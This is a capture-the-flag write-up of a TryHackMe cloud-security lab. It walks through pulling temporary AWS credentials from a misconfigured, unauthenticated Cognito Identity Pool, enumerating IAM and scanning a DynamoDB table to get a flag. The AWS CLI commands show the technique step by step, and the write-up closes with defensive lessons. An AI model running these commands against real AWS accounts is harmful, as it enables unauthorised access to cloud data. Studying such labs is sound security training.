# CTF Write-Up: Complimentary

## Challenge Overview

- **Platform:** TryHackMe
- **Challenge:** Complimentary
- **Category:** Cloud Security (AWS)
- **Difficulty:** Medium
- **Objective:** Exploit an insecure Amazon Cognito implementation to obtain temporary AWS credentials and retrieve the flag stored in DynamoDB.

---

## Initial Analysis

After launching the challenge, I began by browsing the web application to understand its functionality. The application did not expose any obvious attack surface, so I started inspecting the client-side resources.

### Landing Page

<img width="975" height="484" alt="image" src="https://github.com/user-attachments/assets/3322a1ec-ce2a-4243-b5a7-9856d6ae8ef7" />


---

## Inspecting the Source Code

The first step was to inspect the page source.

The HTML referenced a JavaScript file named `app.js`, which appeared to contain the application's client-side logic.

To inspect the script, I downloaded it using `curl`.

```bash
curl http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/app.js
```

### app.js Source
<img width="975" height="277" alt="image" src="https://github.com/user-attachments/assets/c4834d64-94bb-4ed7-854f-262ed913daf5" />



After reviewing the code, I noticed that the application was using **Amazon Cognito** for authentication.

More importantly, the application relied on **local authentication** and did not properly verify whether a user was authenticated before requesting AWS credentials.

This indicated that it might be possible to obtain temporary AWS credentials without successfully logging in.

---
<img width="975" height="199" alt="image" src="https://github.com/user-attachments/assets/770010e0-7f11-437c-b014-81e3ae06e5ae" />

## Obtaining AWS Credentials

<img width="975" height="301" alt="image" src="https://github.com/user-attachments/assets/35373051-a01c-4219-a89b-a0f1d4fc2f80" />


Using the Cognito Identity Pool information discovered in `app.js`, I requested an identity ID.

```bash
aws cognito-identity get-id \
--identity-pool-id <IDENTITY_POOL_ID>
```

Example Output

```text
{
    "IdentityId": "REGION:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

Next, I requested temporary AWS credentials.

```bash
aws cognito-identity get-credentials-for-identity \
--identity-id <IDENTITY_ID>
```

Example Output

```text
{
    "Credentials": {
        "AccessKeyId": "...",
        "SecretKey": "...",
        "SessionToken": "..."
    }
}
```
<img width="975" height="277" alt="image" src="https://github.com/user-attachments/assets/319deb14-13e8-4ac9-9a60-d3f48d7245b8" />
I then configured the AWS CLI using the retrieved credentials.

```bash
aws configure
```

or

```bash
export AWS_ACCESS_KEY_ID=<ACCESS_KEY>
export AWS_SECRET_ACCESS_KEY=<SECRET_KEY>
export AWS_SESSION_TOKEN=<SESSION_TOKEN>
```


---

## Enumerating AWS Permissions

With temporary credentials configured, I attempted to enumerate the AWS environment.

Some common IAM enumeration commands were executed.

```bash
aws sts get-caller-identity
```

```bash
aws iam list-users
```

```bash
aws iam list-roles
```

Most IAM-related commands returned **AccessDenied**, indicating that the credentials had limited permissions.

---

## Discovering the Flag

The challenge description contained an important hint suggesting that the flag might be stored inside a database.

Based on that clue, I shifted my focus to **Amazon DynamoDB**.
<img width="433" height="323" alt="image" src="https://github.com/user-attachments/assets/be2951a0-e4f3-45c2-abd7-32b5630952d5" />

After identifying the table, I scanned it.

```bash
aws dynamodb scan --table-name <table-name>
<img width="975" height="361" alt="image" src="https://github.com/user-attachments/assets/72634185-70d0-4265-ba2b-13f34953a059" />

```

Example Output

```text
{
    "Items": [
        {
            "flag": {
                "S": "THM{...}"
            }
        }
    ]
}
```

The scan successfully returned the challenge flag.
---

### Flag
<img width="975" height="226" alt="image" src="https://github.com/user-attachments/assets/f48ed48d-d224-4003-b1f2-37ea4e431e13" />



---

# Concept

This challenge demonstrates an **Amazon Cognito misconfiguration**.

Amazon Cognito Identity Pools provide temporary AWS credentials to users. If the identity pool is configured to allow unauthenticated users to obtain credentials, attackers may gain access to AWS resources without logging in.

Although the credentials in this challenge had restricted IAM permissions, they still permitted access to a DynamoDB table containing sensitive information.

This highlights several important cloud security concepts:

- Never grant unnecessary permissions to unauthenticated Cognito identities.
- Follow the **Principle of Least Privilege** when assigning IAM policies.
- Avoid exposing sensitive configuration details through client-side JavaScript.
- Regularly audit IAM policies associated with Cognito Identity Pools.

---

# Key Takeaways

- Client-side JavaScript can reveal valuable cloud infrastructure details.
- Cognito Identity Pools should not expose credentials to unauthenticated users unless absolutely necessary.
- Limited AWS credentials can still lead to sensitive data exposure.
- Always enumerate available AWS services when IAM permissions appear restricted.
- Challenge descriptions often contain subtle hints that guide further enumeration.

---

# Tools Used

- Browser Developer Tools
- curl
- AWS CLI
- Amazon Cognito
- Amazon DynamoDB
